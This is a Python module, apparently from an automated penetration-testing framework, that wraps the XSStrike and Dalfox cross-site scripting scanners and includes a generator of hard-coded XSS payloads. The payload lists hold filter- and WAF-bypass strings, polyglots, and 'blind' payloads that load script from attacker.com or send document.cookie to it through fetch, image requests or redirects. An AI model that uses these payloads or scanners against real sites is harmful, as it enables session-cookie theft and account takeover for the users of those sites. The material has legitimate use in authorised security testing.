#!/usr/bin/env python3
"""
XSS攻击工具集
"""

import subprocess
import json
import logging
import re
from typing import Any, Dict, List
from dataclasses import dataclass, field

from core.tool_registry import BaseTool, ToolCategory, ToolParameter

logger = logging.getLogger(__name__)


@dataclass
class XSStrikeTool(BaseTool):
    """XSStrike XSS扫描"""
    name: str = "xsstrike"
    description: str = "XSStrike - 高级XSS检测和利用工具"
    category: ToolCategory = ToolCategory.WEB_ATTACK
    parameters: List[ToolParameter] = field(default_factory=lambda: [
        ToolParameter("url", "string", "目标URL", required=True),
        ToolParameter("data", "string", "POST数据", required=False, default=""),
        ToolParameter("headers", "string", "自定义Header(JSON格式)", required=False, default=""),
        ToolParameter("crawl", "boolean", "爬取并测试", required=False, default=False),
        ToolParameter("blind", "boolean", "盲XSS测试", required=False, default=False),
        ToolParameter("fuzzer", "boolean", "启用Fuzzer", required=False, default=False),
    ])
    timeout: int = 600
    
    def execute(self, params: Dict[str, Any], session_id: str = None) -> Dict[str, Any]:
        url = params["url"]
        data = params.get("data", "")
        headers = params.get("headers", "")
        crawl = params.get("crawl", False)
        blind = params.get("blind", False)
        fuzzer = params.get("fuzzer", False)
        
        cmd = ["xsstrike", "-u", url, "--skip"]
        
        if data:
            cmd.extend(["--data", data])
        if headers:
            try:
                h_dict = json.loads(headers)
                for k, v in h_dict.items():
                    cmd.extend(["--headers", f"{k}: {v}"])
            except json.JSONDecodeError:
                pass
        if crawl:
            cmd.append("--crawl")
        if blind:
            cmd.append("--blind")
        if fuzzer:
            cmd.append("--fuzzer")
        
        try:
            logger.info(f"执行XSStrike: {' '.join(cmd)}")
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=self.timeout
            )
            
            # 解析输出
            vulnerabilities = self._parse_output(result.stdout)
            
            return {
                "success": True,
                "url": url,
                "vulnerabilities": vulnerabilities,
                "total_found": len(vulnerabilities),
                "raw_output": result.stdout,
                "command": ' '.join(cmd)
            }
            
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "扫描超时"}
        except FileNotFoundError:
            return {"success": False, "error": "xsstrike未安装，请运行: pip install xsstrike 或 git clone https://github.com/s0md3v/XSStrike.git"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _parse_output(self, output: str) -> List[Dict[str, Any]]:
        """解析XSStrike输出"""
        vulnerabilities = []
        
        # 查找反射点
        reflection_pattern = r"Reflections found:\s*(\d+)"
        reflection_match = re.search(reflection_pattern, output)
        
        # 查找XSS漏洞
        xss_patterns = [
            r"Payload:\s*(.+)",
            r"Vulnerable:\s*(.+)",
            r"\[Vulnerable\]\s*(.+)"
        ]
        
        for pattern in xss_patterns:
            for match in re.finditer(pattern, output):
                vulnerabilities.append({
                    "type": "XSS",
                    "payload": match.group(1).strip(),
                    "reflections": reflection_match.group(1) if reflection_match else "unknown"
                })
        
        return vulnerabilities


@dataclass
class DalfoxTool(BaseTool):
    """Dalfox XSS扫描"""
    name: str = "dalfox"
    description: str = "Dalfox - 快速参数分析和XSS扫描工具"
    category: ToolCategory = ToolCategory.WEB_ATTACK
    parameters: List[ToolParameter] = field(default_factory=lambda: [
        ToolParameter("url", "string", "目标URL(带参数)", required=True),
        ToolParameter("cookie", "string", "Cookie", required=False, default=""),
        ToolParameter("blind", "string", "盲XSS回调URL", required=False, default=""),
        ToolParameter("output_format", "string", "输出格式", required=False, default="json",
                     choices=["json", "plain"]),
        ToolParameter("worker", "integer", "并发数", required=False, default=10),
    ])
    timeout: int = 600
    
    def execute(self, params: Dict[str, Any], session_id: str = None) -> Dict[str, Any]:
        url = params["url"]
        cookie = params.get("cookie", "")
        blind = params.get("blind", "")
        output_format = params.get("output_format", "json")
        worker = params.get("worker", 10)
        
        cmd = ["dalfox", "url", url, "-w", str(worker)]
        
        if output_format == "json":
            cmd.append("--format=json")
        if cookie:
            cmd.extend(["-C", cookie])
        if blind:
            cmd.extend(["--blind", blind])
        
        try:
            logger.info(f"执行Dalfox: {' '.join(cmd)}")
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=self.timeout
            )
            
            vulnerabilities = []
            if output_format == "json":
                try:
                    for line in result.stdout.strip().split('\n'):
                        if line:
                            data = json.loads(line)
                            vulnerabilities.append({
                                "type": data.get("type"),
                                "inject_type": data.get("inject_type"),
                                "poc": data.get("poc"),
                                "method": data.get("method"),
                                "param": data.get("param"),
                                "payload": data.get("payload"),
                                "evidence": data.get("evidence")
                            })
                except json.JSONDecodeError:
                    pass
            
            return {
                "success": True,
                "url": url,
                "vulnerabilities": vulnerabilities,
                "total_found": len(vulnerabilities),
                "raw_output": result.stdout,
                "command": ' '.join(cmd)
            }
            
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "扫描超时"}
        except FileNotFoundError:
            return {"success": False, "error": "dalfox未安装，请运行: go install github.com/hahwul/dalfox/v2@latest"}
        except Exception as e:
            return {"success": False, "error": str(e)}


@dataclass
class XSSPayloadTool(BaseTool):
    """XSS Payload生成器"""
    name: str = "xss_payload"
    description: str = "XSS Payload生成器 - 生成各类XSS测试载荷"
    category: ToolCategory = ToolCategory.WEB_ATTACK
    parameters: List[ToolParameter] = field(default_factory=lambda: [
        ToolParameter("type", "string", "Payload类型", required=True,
                     choices=["basic", "event", "tag", "bypass", "polyglot", "blind"]),
        ToolParameter("context", "string", "注入上下文", required=False, default="html",
                     choices=["html", "attribute", "script", "url", "style"]),
        ToolParameter("encode", "string", "编码方式", required=False, default="",
                     choices=["", "html", "url", "unicode", "base64"]),
    ])
    timeout: int = 10
    
    def execute(self, params: Dict[str, Any], session_id: str = None) -> Dict[str, Any]:
        payload_type = params["type"]
        context = params.get("context", "html")
        encode = params.get("encode", "")
        
        payloads = self._generate_payloads(payload_type, context)
        
        if encode:
            payloads = [{"original": p, "encoded": self._encode_payload(p, encode)} 
                       for p in payloads]
        else:
            payloads = [{"payload": p} for p in payloads]
        
        return {
            "success": True,
            "type": payload_type,
            "context": context,
            "payloads": payloads,
            "count": len(payloads)
        }
    
    def _generate_payloads(self, ptype: str, context: str) -> List[str]:
        """生成Payload"""
        payloads = []
        
        if ptype == "basic":
            payloads.extend([
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                '"><script>alert(1)</script>',
                "'-alert(1)-'",
                '"><img src=x onerror=alert(1)>',
            ])
        
        elif ptype == "event":
            payloads.extend([
                "<div onmouseover=alert(1)>hover</div>",
                "<input onfocus=alert(1) autofocus>",
                "<details open ontoggle=alert(1)>",
                "<video src=x onerror=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "<marquee onstart=alert(1)>",
                "<object data=javascript:alert(1)>",
                "<iframe src=javascript:alert(1)>",
            ])
        
        elif ptype == "tag":
            payloads.extend([
                "<script>alert(1)</script>",
                "<ScRiPt>alert(1)</ScRiPt>",
                "<scr<script>ipt>alert(1)</scr</script>ipt>",
                "<script/src=//attacker.com/x.js>",
                "<svg/onload=alert(1)>",
                "<svg><script>alert(1)</script></svg>",
                "<math><maction actiontype=statusline#http://attacker.com>click</maction></math>",
            ])
        
        elif ptype == "bypass":
            payloads.extend([
                # 大小写绕过
                "<ScRiPt>alert(1)</ScRiPt>",
                # 编码绕过
                "<script>\\u0061lert(1)</script>",
                "&#60;script&#62;alert(1)&#60;/script&#62;",
                # 空格绕过
                "<script>alert(1)</script >",
                "<svg/onload=alert(1)>",
                # 注释绕过
                "<!--><script>alert(1)</script>-->",
                # 事件绕过
                '"><svg/onload=confirm(1)>"',
                # 协议绕过
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                # WAF绕过
                "<script>al\\u0065rt(1)</script>",
                "<img src=x onerror=al\\x65rt(1)>",
            ])
        
        elif ptype == "polyglot":
            payloads.extend([
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
                "\"><img src=x id=alert(1) onerror=eval(id)>'><img src=x id=alert(1) onerror=eval(id)>",
            ])
        
        elif ptype == "blind":
            payloads.extend([
                '"><script src=//attacker.com/x.js></script>',
                "<img src=x onerror='new Image().src=\"//attacker.com/?c=\"+document.cookie'>",
                "<script>fetch('//attacker.com/?c='+document.cookie)</script>",
                '"><script>document.location="//attacker.com/?c="+document.cookie</script>',
            ])
        
        return payloads
    
    def _encode_payload(self, payload: str, encode_type: str) -> str:
        """编码Payload"""
        import urllib.parse
        import base64
        import html
        
        if encode_type == "html":
            return html.escape(payload)
        elif encode_type == "url":
            return urllib.parse.quote(payload)
        elif encode_type == "unicode":
            return "".join(f"\\u{ord(c):04x}" for c in payload)
        elif encode_type == "base64":
            return base64.b64encode(payload.encode()).decode()
        
        return payload
